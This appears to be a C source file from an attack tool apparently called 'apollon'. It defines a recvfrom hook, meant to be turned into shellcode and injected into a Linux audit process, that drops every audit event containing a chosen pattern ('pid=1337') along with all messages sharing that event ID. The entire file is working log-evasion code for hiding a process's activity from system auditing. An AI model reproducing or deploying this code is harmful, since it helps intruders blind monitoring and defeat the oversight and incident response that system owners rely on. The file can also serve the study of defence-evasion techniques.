#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>

/*
 * hook function for intercepting recvfrom calls. This function performs
 * the syscall and inspects the returned bytes. If the specified sequence
 * is found within the returned bytes, recvfrom is called again until a
 * new event is obtained that does no longer match the pattern.
 */
ssize_t hook_func(int sockfd, char* buf, size_t len, int flags, struct sockaddr* src_addr, socklen_t* addrlen)
{
    /*
     * Receive the next audit event message from netlink.
     */
    ssize_t length = recvfrom(sockfd, buf, len, flags, src_addr, addrlen);

    /*
     * Now we go to the audit_message (buf + 16) and check whether it contains the desired
     * pattern. The example pattern from here needs to be replaced in the generated
     * shellcode. This can be done dynamically. apollon replaces the pattern 0xffffffffff01
     * with a pointer to the second command line argument.
     */
    while (strstr(buf + 16, "pid=1337"))
    {
        /*
         * Since a single event is usually scattered around multiple event messages, we
         * need to obtain the event ID (buf + 37) and filter all proceeding event messages
         * that belong to the same event.
         */
        unsigned int curr_event = 0;
        unsigned int filter_event = strtoul(buf + 37, NULL, 0);

        /*
         * Request new events until the received event ID  does no longer match the filtered
         * event ID. If this is the case, simply continue with the outer loop, as the new event
         * could match the filter again.
         */
        do
        {
            length = recvfrom(sockfd, buf, len, flags, src_addr, addrlen);
            curr_event = strtoul(buf + 37, NULL, 0);
        }

        while (curr_event == filter_event);
    }

    return length;
}
